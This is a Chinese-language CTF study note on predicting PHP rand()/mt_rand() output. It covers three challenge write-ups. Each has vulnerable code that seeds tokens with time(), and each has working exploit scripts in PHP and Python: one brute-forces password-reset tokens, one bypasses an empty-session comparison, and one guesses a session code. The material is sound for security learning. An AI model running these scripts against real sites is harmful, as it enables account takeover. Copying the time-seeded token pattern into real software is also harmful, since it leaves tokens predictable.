



# PHP伪随机数问题

[TOC]



## PHP伪随机数种子爆破

### 问题函数

- rand()
- mt_rand()



php中常用的随机数产生函数是 rand() 和 mt_rand()。但是生成的是伪随机数，不能应用于生成安全令牌、核心加解密 key 等。否则会产生一些安全问题。



查看源码发现，每次调用 mt_rand() 都会先检查是否已经播种。如果已经播种就直接产生随机数，否则系统进行自动播种。也就是说每个php进程期间，只有第一次调用 mt_rand() 会自动播种。接下来都会根据这个第一次播种的种子来生成随机数。



**一段时间内的请求，服务器是用同一个进程处理的。**这无疑加大了 rand() 和 mt_rand() 的利用难度，使之较为安全。因为你根本不知道服务器何时会回收进程，也就不知道何时会播种，也不知道你这次请求的第一个随机数其实是播种后产生的第几个随机数，无法爆破种子。**除非，网站几乎没人访问，或者夜黑风高之时。**





### 利用工具

[php_mt_seed](https://www.openwall.com/php_mt_seed) 





### 考点

#### 1.根据种子预测随机数

##### 例题：小明学习代码审计writeup

```php
<?php 
session_start();
include '_flag.php';
date_default_timezone_set('Asia/Shanghai');
if(isset($_POST['token']) && isset($_SESSION['token']) &&!empty($_POST['token'])&&!empty($_SESSION['token'])){
    if($_POST['token']==$_SESSION['token']){
        echo "PassResetSuccess! Your Flag is:".$flag;
    }else{
    	echo "Token_error!";
    }
}else{
    mt_srand(time());
    $rand= mt_rand();
    $_SESSION['token']=sha1(md5($rand));
    echo "Token Generate Ok! now send email to your EmailBox!.....";
    if(sendmymail($_SESSION['token'])){
    	echo "SendOK! \r\n<br> Your password reset Token has been send to your mailbox! <br>Please Check your mail box and fill your token here to reset your password!<br>";
    };
}
echo '<form action="" method="POST">
	<input type="text" name="token">
    <input type="submit" value="submit">
</form>';
echo "<!--\r\n".file_get_contents(__FILE__);
?>
```



只有本地与服务端的token一致才可以得到flag，随机数生成的种子为time()，为了保证可以碰撞到正确的时间，可以设定一个时间区间

```php
$base = time();  
//设定一个时间区间，来确保可以碰撞到正确的时间
for($i = -5;$i <= 5;$i++)
{
    mt_srand($base+$i);
    $rand = mt_rand();
    echo sha1(md5($rand))."<br/>";
}
```



exp

```python
import requests
r = requests.get('http://localhost/srand/index.php')
rlt = r.text.split('<br/>')
rlt = rlt[:-1]
data = {}
header  = {"Cookie":"PHPSESSID=294a9b966570ae34347a613e894d3271","Referer":"http://lab1.xseclab.com/pentest6_210deacdf09c9fe184d16c8f7288164f/index.php"}
url = 'http://lab1.xseclab.com/pentest6_210deacdf09c9fe184d16c8f7288164f/resetpwd.php'
#重置token
r = requests.get(url,headers=header)

for i in rlt:
    data["token"] = i
    r = requests.post(url,data=data,headers=header)
    r.encoding = r.apparent_encoding
    if "Token_error!" not in r.text[:60]:
        print(r.text[:60])
```







##### 例题：湖湘杯

```php
<?php
error_reporting(0);
$flag = "*********************";
echo "please input a rand_num !";
function create_password($pw_length = 10) {
    $randpwd = "";
    for ($i = 0; $i < $pw_length; $i++) {
        $randpwd .= chr(mt_rand(100, 200));
    }
    return $randpwd;
}

session_start();
var_dump($_SESSION);

mt_srand(time());

$pwd = create_password();
var_dump(($_SESSION['userLogin'] == $_GET['login']));

echo $pwd . '||';

if ($pwd == $_GET['pwd']) {
    echo "first";
    if ($_SESSION['userLogin'] == $_GET['login']) {
        echo "Nice , you get the flag it is " . $flag;
    }

} else {
    echo "Wrong!";
}

$_SESSION['userLogin'] = create_password(32) . rand();

?>

```

mt_srand()函数用time()做种子值， 相当于已知的， 我们可以本地用time()这个种子值去预测pwd的值， 这第一层判断很容易绕过， 第二层的判断就有点迷了

发现这个第二层的判断为`if ($_SESSION['userLogin'] == $_GET['login'])`,  只是简单的判断了下是否相等，而没有判断$\_GET['login'] 这个值是否为空， 因为程序如果第一次加载，那么此时$\_SESSION还没有赋值，$_SESSION['login'] 的内容自然是空， NULL===NULL, 很容易就绕过了第二层， 因此这题第二层判断形如虚设:



exp

```php
<?php

function create_password($pw_length =  10){
	$randpwd = "";
	for ($i = 0; $i < $pw_length; $i++){
		$randpwd .= chr(mt_rand(100, 200));
	}
	return $randpwd;

}//还原我们创建密码的函数

session_start();
for ($i=time()-10; $i < time()+10; $i++) { 
	# code...
	mt_srand($i);
	$pwd=create_password();
	var_dump(file_get_contents("http://xx/46_2.php?pwd=$pwd&login=")."<br>");  //直接get提交pwd

};

?>
```



运行脚本时发现，使用脚本访问每次的session不一样，所以可以无视掉$_SESSION['userLogin'] = create_password(32) . rand();。

每次访问的时候第二层的过滤形同虚设。



既然每次session不一致，则每次都是不同的进程，mt_srand每次都是从头开始生成，这样就可以爆破了。







#### 2.根据随机数预测种子

以上面生成的随机数为例，假设我们知道了第一个生成的随机数，那我们怎么预测种子呢？
那就要用到[php_mt_seed](https://github.com/lepiaf/php_mt_seed)这个工具了。



##### 例题：EIS 

```php
<?php
include "flag.php";
session_start();
if (isset($_GET['code']) && intval($_GET['code']) === $_SESSION['code']) {
    die($flag);
} else {echo "wrong answer!";}
srand(rand(0, MAX_NUM));
for ($i = 0; $i < 3; $i++) {
    echo "<h3>randnum$i:" . rand(0, MAX_NUM) . "</h3><br>";
}
echo 'sessionid: ' . session_id();
var_dump($_SESSION);
$_SESSION['code'] = rand(0, MAX_NUM);
var_dump($_SESSION);
?>
<form action="" method="get">
the next random num is:<input type="text" name="code"/>
<input type="submit"/>
</form>

```



前三次的会给你，预测到第四次即可。当然这里可以直接爆破，随机数范围小于1000，可以爆破

```python
import requests

url = 'http://0.0.0.0:91/index.php'
s = requests.session()

# headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0'}
# html = s.get(url,headers=headers)

for i in range(1000):
    #s = requests.session()

    url2 = url+'?code='+str(i)
    res = s.get(url2)
    print res.content
    if 'flag' in res.content:
        print res.content 
        break

```









# 参考文章

- [PHP中的随机数](https://nonuplebroken.com/2019/08/03/PHP%E4%B8%AD%E7%9A%84%E9%9A%8F%E6%9C%BA%E6%95%B0/#%E4%B8%80%E4%B8%AA%E8%A7%84%E5%BE%8B)
- [php伪随机数](https://blog.csdn.net/zss192/article/details/104327432)